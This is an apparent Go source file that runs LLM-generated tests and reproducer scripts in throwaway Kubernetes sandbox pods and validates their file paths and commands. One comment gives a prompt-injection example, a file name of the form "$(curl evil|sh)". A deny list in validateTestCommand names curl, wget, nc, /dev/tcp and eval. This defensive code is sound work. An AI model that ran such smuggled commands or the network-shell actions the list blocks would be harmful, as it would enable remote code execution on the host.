package executors

import (
	"bytes"
	"context"
	"fmt"
	"path/filepath"
	"strings"
	"time"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"

	"github.com/karimzakzouk/sentinel/internal/logging"
	"github.com/karimzakzouk/sentinel/internal/schemas"
)

// TestRunner runs LLM-generated tests + reproducers in the sandbox. It
// creates a one-shot pod with the canary image, injects the test/reproducer
// file via ConfigMap, runs the command, and parses the output.
type TestRunner struct {
	clientset kubernetes.Interface
}

// NewTestRunner creates a TestRunner.
func NewTestRunner(clientset kubernetes.Interface) *TestRunner {
	return &TestRunner{clientset: clientset}
}

// TestResult is the outcome of running a test or reproducer.
type TestResult struct {
	// F2P = FAIL_TO_PASS: test fails on original, passes on fixed.
	F2PResult TestRunResult
	// P2P = PASS_TO_PASS: existing tests still pass on fixed.
	P2PResult TestRunResult
	// Overall: true if F2P passed (test reproduces bug + fix works) AND
	// P2P passed (no regression) — or P2P was skipped.
	Overall bool
	// Summary for the sandbox result + PR body.
	Summary string
}

// TestRunResult is the output of running a single test command.
type TestRunResult struct {
	Passed  bool
	Output  string
	Skipped bool
}

// RunTest executes the LLM-generated test in the sandbox namespace.
// fixCanaryImage is the canary image with the fix applied (already built
// by Kaniko). test is the LLM-generated test. sandboxNS is the sandbox
// namespace (already created by the sandbox runner).
func (r *TestRunner) RunTest(ctx context.Context, fixCanaryImage, sandboxNS string, test *schemas.GeneratedTest) (*TestResult, error) {
	if test == nil || test.TestContent == "" {
		return &TestResult{
			Overall: true,
			Summary: "no test generated (test gate skipped)",
		}, nil
	}

	// SECURITY: validate the LLM-generated test file path + command before
	// interpolating them into a shell command. A prompt-injected LLM could
	// return malicious values like TestFile="$(curl evil|sh)".
	validatedTestFile := validateTestFilePath(test.TestFile)
	if validatedTestFile == "" {
		logging.Info("SECURITY: test file path rejected, using default", "original", test.TestFile)
		validatedTestFile = "test_generated.py"
	}
	testCmd := validateTestCommand(test.TestCommand, test.TestLanguage, test.TestFramework, validatedTestFile)
	if testCmd == "" {
		testCmd = defaultTestCommand(test.TestLanguage, test.TestFramework, validatedTestFile)
	}

	logging.Info("running regression test",
		"file", validatedTestFile, "namespace", sandboxNS,
		"framework", test.TestFramework, "cmd", testCmd)

	// ConfigMap keys can't contain "/" — use just the filename.
	cmKey := validatedTestFile
	if idx := strings.LastIndex(cmKey, "/"); idx >= 0 {
		cmKey = cmKey[idx+1:]
	}
	cmName := fmt.Sprintf("test-%d", time.Now().Unix())
	testCM := &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{
			Name:      cmName,
			Namespace: sandboxNS,
			Labels:    map[string]string{"sentinel.io/sandbox": "true"},
		},
		Data: map[string]string{
			cmKey: test.TestContent,
		},
	}
	if _, err := r.clientset.CoreV1().ConfigMaps(sandboxNS).Create(ctx, testCM, metav1.CreateOptions{}); err != nil {
		return nil, fmt.Errorf("create test configmap: %w", err)
	}
	defer func() {
		_ = r.clientset.CoreV1().ConfigMaps(sandboxNS).Delete(ctx, cmName, metav1.DeleteOptions{})
	}()

	testPodName := fmt.Sprintf("test-runner-%d", time.Now().Unix())
	testPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      testPodName,
			Namespace: sandboxNS,
			Labels: map[string]string{
				"sentinel.io/sandbox": "true",
				"app":                 "test-runner",
			},
		},
		Spec: corev1.PodSpec{
			RestartPolicy: corev1.RestartPolicyNever,
			Containers: []corev1.Container{
				{
					Name:            "test-runner",
					Image:           fixCanaryImage,
					ImagePullPolicy: corev1.PullIfNotPresent,
					Command:         []string{"/bin/sh", "-c"},
					Args: []string{
						fmt.Sprintf(
							"mkdir -p /app/$(dirname %s) && "+
								"cp /test-file/%s /app/%s && "+
								"cd /app && "+
								"%s 2>&1 || true",
							validatedTestFile, cmKey, validatedTestFile, testCmd,
						),
					},
					VolumeMounts: []corev1.VolumeMount{
						{Name: "test-file", MountPath: "/test-file"},
					},
				},
			},
			Volumes: []corev1.Volume{
				{
					Name: "test-file",
					VolumeSource: corev1.VolumeSource{
						ConfigMap: &corev1.ConfigMapVolumeSource{
							LocalObjectReference: corev1.LocalObjectReference{Name: cmName},
						},
					},
				},
			},
		},
	}

	if _, err := r.clientset.CoreV1().Pods(sandboxNS).Create(ctx, testPod, metav1.CreateOptions{}); err != nil {
		return nil, fmt.Errorf("create test pod: %w", err)
	}
	defer func() {
		_ = r.clientset.CoreV1().Pods(sandboxNS).Delete(ctx, testPodName, metav1.DeleteOptions{})
	}()

	podOutput, err := r.waitForPodCompletion(ctx, sandboxNS, testPodName, "test-runner", 120*time.Second)
	if err != nil {
		return &TestResult{
			F2PResult: TestRunResult{Passed: false, Output: fmt.Sprintf("test pod failed: %v\n%s", err, podOutput)},
			Summary:   fmt.Sprintf("test_execution_failed: %v", err),
		}, nil
	}

	passed := interpretTestOutput(podOutput, test.TestFramework)
	result := &TestResult{
		F2PResult: TestRunResult{
			Passed: passed,
			Output: podOutput,
		},
		Overall: passed,
	}
	if passed {
		result.Summary = fmt.Sprintf("test PASSED: %s\n--- Test Output ---\n%s", test.Description, lastN(podOutput, 1000))
	} else {
		result.Summary = fmt.Sprintf("test FAILED: %s\n--- Test Output ---\n%s", test.Description, lastN(podOutput, 2000))
	}

	logging.Info("test complete", "file", test.TestFile, "passed", passed)
	return result, nil
}

// waitForPodCompletion waits for a pod to reach Succeeded/Failed state and
// returns the pod's logs. containerName lets the same method serve the
// reproducer path (container "repro-runner") as well as the test path
// (container "test-runner").
func (r *TestRunner) waitForPodCompletion(ctx context.Context, ns, name, containerName string, timeout time.Duration) (string, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
		}
		pod, err := r.clientset.CoreV1().Pods(ns).Get(ctx, name, metav1.GetOptions{})
		if err != nil {
			time.Sleep(3 * time.Second)
			continue
		}
		if pod.Status.Phase == corev1.PodSucceeded || pod.Status.Phase == corev1.PodFailed {
			req := r.clientset.CoreV1().Pods(ns).GetLogs(name, &corev1.PodLogOptions{
				Container: containerName,
			})
			stream, err := req.Stream(ctx)
			if err != nil {
				return "", fmt.Errorf("fetch test pod logs: %w", err)
			}
			defer stream.Close()
			buf := new(bytes.Buffer)
			_, _ = buf.ReadFrom(stream)
			return buf.String(), nil
		}
		time.Sleep(3 * time.Second)
	}
	return "", fmt.Errorf("test pod timed out after %v", timeout)
}

// RunReproducer executes the LLM-generated reproducer script in the sandbox.
// The reproducer is a standalone script (no test framework) that calls the
// buggy function and exits 0 if OK, 1 if crash.
func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS string, reproducer *schemas.GeneratedReproducer) (*TestResult, error) {
	if reproducer == nil || reproducer.ScriptContent == "" {
		return &TestResult{
			Overall: true,
			Summary: "no reproducer generated (reproducer gate skipped)",
		}, nil
	}

	logging.Info("running reproducer",
		"file", reproducer.ScriptFile, "namespace", sandboxNS,
		"language", reproducer.ScriptLanguage)

	validatedScriptFile := validateTestFilePath(reproducer.ScriptFile)
	if validatedScriptFile == "" {
		logging.Info("SECURITY: reproducer script path rejected, using default", "original", reproducer.ScriptFile)
		validatedScriptFile = "reproduce_error.py"
	}
	runCmd := validateTestCommand(reproducer.RunCommand, reproducer.ScriptLanguage, "", validatedScriptFile)
	if runCmd == "" {
		runCmd = defaultReproducerCommand(reproducer.ScriptLanguage, validatedScriptFile)
	}

	cmName := fmt.Sprintf("repro-%d", time.Now().Unix())
	cmKey := validatedScriptFile
	if cmKey == "" {
		cmKey = "reproduce_error.py"
	}
	reproCM := &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{
			Name:      cmName,
			Namespace: sandboxNS,
			Labels:    map[string]string{"sentinel.io/sandbox": "true"},
		},
		Data: map[string]string{
			cmKey: reproducer.ScriptContent,
		},
	}
	if _, err := r.clientset.CoreV1().ConfigMaps(sandboxNS).Create(ctx, reproCM, metav1.CreateOptions{}); err != nil {
		return nil, fmt.Errorf("create reproducer configmap: %w", err)
	}
	defer func() {
		_ = r.clientset.CoreV1().ConfigMaps(sandboxNS).Delete(ctx, cmName, metav1.DeleteOptions{})
	}()

	reproPodName := fmt.Sprintf("repro-runner-%d", time.Now().Unix())
	reproPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      reproPodName,
			Namespace: sandboxNS,
			Labels: map[string]string{
				"sentinel.io/sandbox": "true",
				"app":                 "repro-runner",
			},
		},
		Spec: corev1.PodSpec{
			RestartPolicy: corev1.RestartPolicyNever,
			Containers: []corev1.Container{
				{
					Name:            "repro-runner",
					Image:           canaryImage,
					ImagePullPolicy: corev1.PullIfNotPresent,
					Command:         []string{"/bin/sh", "-c"},
					Args: []string{
						fmt.Sprintf(
							"cp /repro-file/%s /app/%s && cd /app && %s 2>&1",
							validatedScriptFile, validatedScriptFile, runCmd,
						),
					},
					VolumeMounts: []corev1.VolumeMount{
						{Name: "repro-file", MountPath: "/repro-file"},
					},
				},
			},
			Volumes: []corev1.Volume{
				{
					Name: "repro-file",
					VolumeSource: corev1.VolumeSource{
						ConfigMap: &corev1.ConfigMapVolumeSource{
							LocalObjectReference: corev1.LocalObjectReference{Name: cmName},
						},
					},
				},
			},
		},
	}

	if _, err := r.clientset.CoreV1().Pods(sandboxNS).Create(ctx, reproPod, metav1.CreateOptions{}); err != nil {
		return nil, fmt.Errorf("create reproducer pod: %w", err)
	}
	defer func() {
		_ = r.clientset.CoreV1().Pods(sandboxNS).Delete(ctx, reproPodName, metav1.DeleteOptions{})
	}()

	podOutput, err := r.waitForPodCompletion(ctx, sandboxNS, reproPodName, "repro-runner", 120*time.Second)
	if err != nil {
		return &TestResult{
			Overall: false,
			Summary: fmt.Sprintf("reproducer pod failed: %v\n%s", err, podOutput),
		}, nil
	}

	// The reproducer exits 0 on success, 1 on crash. Check pod phase first.
	pod, _ := r.clientset.CoreV1().Pods(sandboxNS).Get(ctx, reproPodName, metav1.GetOptions{})
	passed := pod != nil && pod.Status.Phase == corev1.PodSucceeded

	lowerOutput := strings.ToLower(podOutput)
	if strings.Contains(lowerOutput, "traceback") || strings.Contains(lowerOutput, "panic:") ||
		strings.Contains(lowerOutput, "crash") || strings.Contains(lowerOutput, "error:") {
		passed = false
	}

	result := &TestResult{
		Overall: passed,
		Summary: fmt.Sprintf("reproducer %s: %s\n--- Output ---\n%s",
			map[bool]string{true: "PASSED", false: "FAILED"}[passed],
			reproducer.Description,
			lastN(podOutput, 1000)),
	}

	logging.Info("reproducer complete", "file", reproducer.ScriptFile, "passed", passed)
	return result, nil
}

// defaultReproducerCommand returns a default run command for the given language.
func defaultReproducerCommand(language, scriptFile string) string {
	switch strings.ToLower(language) {
	case "python":
		return fmt.Sprintf("python /app/%s", scriptFile)
	case "go":
		return fmt.Sprintf("cd /app && go run %s", scriptFile)
	case "javascript", "typescript":
		return fmt.Sprintf("node /app/%s", scriptFile)
	case "ruby":
		return fmt.Sprintf("ruby /app/%s", scriptFile)
	default:
		return fmt.Sprintf("echo 'unknown language: %s' && exit 1", language)
	}
}

// defaultTestCommand returns a default test command for the given
// language/framework.
func defaultTestCommand(language, framework, testFile string) string {
	switch strings.ToLower(language) {
	case "python":
		return fmt.Sprintf("python -m pytest %s -v", testFile)
	case "go":
		return "go test -v -run . ./..."
	case "javascript", "typescript":
		if strings.Contains(strings.ToLower(framework), "jest") {
			return fmt.Sprintf("npx jest %s --verbose", testFile)
		}
		return fmt.Sprintf("npx mocha %s", testFile)
	case "java":
		return fmt.Sprintf("mvn test -Dtest=%s", strings.TrimSuffix(testFile, ".java"))
	case "ruby":
		return fmt.Sprintf("ruby -Ilib -Itest %s", testFile)
	case "rust":
		return "cargo test"
	default:
		return fmt.Sprintf("echo 'unknown language: %s' && exit 1", language)
	}
}

// interpretTestOutput heuristically determines if a test passed based on
// output. Different frameworks have different success/failure indicators;
// success indicators override failure indicators when both are present
// (e.g. "1 passed, 0 failed" should pass).
func interpretTestOutput(output, framework string) bool {
	lower := strings.ToLower(output)
	failureIndicators := []string{
		"failed", "failure", "error", "traceback", "assertionerror",
		"panic:", "not ok", "✗", "0 passing", "0 passed",
		"tests failed", "test failed", "failures:", "failed tests",
	}
	successIndicators := []string{
		"passed", "passing", "ok", "all tests passed", "tests passed",
		"✓", "1 passing", "1 passed", "no errors",
		"--- pass", "test passed",
	}

	for _, ind := range failureIndicators {
		if strings.Contains(lower, ind) {
			for _, success := range successIndicators {
				if strings.Contains(lower, success) {
					if strings.Contains(lower, "0 failed") || strings.Contains(lower, "0 failing") || strings.Contains(lower, "0 failures") {
						return true
					}
					return false
				}
			}
			return false
		}
	}

	for _, ind := range successIndicators {
		if strings.Contains(lower, ind) {
			return true
		}
	}

	return true
}

// validateTestFilePath rejects paths with shell metacharacters, path
// traversal, absolute paths, or control characters. Returns the cleaned
// path on success or "" on rejection. Mirrors validateFilePath in
// agents/fix_proposer.go but duplicated here to avoid a circular import
// (executors → agents → executors).
func validateTestFilePath(path string) string {
	if path == "" {
		return ""
	}
	if len(path) > 500 {
		logging.Info("SECURITY: rejecting test path (too long)", "path", path)
		return ""
	}
	for _, r := range path {
		if r < 0x20 || r == 0x7f {
			logging.Info("SECURITY: rejecting test path (control char)", "path", path)
			return ""
		}
	}
	shellMetachars := []string{"$", "`", ";", "|", "&", "(", ")", "{", "}", "<", ">", "\n", "\r", "*", "?", "[", "]", "!", "#", "~"}
	for _, ch := range shellMetachars {
		if strings.Contains(path, ch) {
			logging.Info("SECURITY: rejecting test path (shell metachar)", "path", path, "char", ch)
			return ""
		}
	}
	if filepath.IsAbs(path) {
		logging.Info("SECURITY: rejecting absolute test path", "path", path)
		return ""
	}
	clean := filepath.Clean(path)
	if clean == "." {
		logging.Info("SECURITY: rejecting test path (resolves to repo root)", "path", path)
		return ""
	}
	if strings.HasPrefix(clean, "..") {
		logging.Info("SECURITY: rejecting test path traversal", "path", path)
		return ""
	}
	return clean
}

// validateTestCommand restricts an LLM-generated test command to a known-safe
// subset. Returns the cleaned command, or "" if rejected (caller falls back
// to defaultTestCommand).
func validateTestCommand(cmd, language, framework, testFile string) string {
	_ = language
	_ = framework
	_ = testFile
	if cmd == "" {
		return ""
	}
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return ""
	}
	if len(cmd) > 500 {
		logging.Info("SECURITY: rejecting test command (too long)", "cmd", cmd)
		return ""
	}
	dangerous := []string{"`", "$(", "${", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r", "curl", "wget", "nc ", "nc$", "/dev/tcp", "bash ", "sh ", "python -c", "python3 -c", "eval ", "exec ", "source ", ". "}
	lower := strings.ToLower(cmd)
	for _, d := range dangerous {
		if strings.Contains(lower, d) {
			logging.Info("SECURITY: rejecting test command (dangerous construct)", "cmd", cmd, "pattern", d)
			return ""
		}
	}
	allowedPrefixes := []string{
		"python ", "python3 ", "python -m pytest", "python3 -m pytest",
		"pytest ", "pytest$", "go test", "node ", "npx jest", "npx mocha",
		"npx vitest", "jest ", "mocha ", "ruby ", "cargo test", "mvn test",
		"gradle test", "dotnet test", "echo ",
	}
	matched := false
	for _, prefix := range allowedPrefixes {
		if strings.HasPrefix(lower, prefix) || lower == strings.TrimSpace(prefix) {
			matched = true
			break
		}
	}
	if !matched {
		logging.Info("SECURITY: rejecting test command (unknown runner)", "cmd", cmd)
		return ""
	}
	return cmd
}
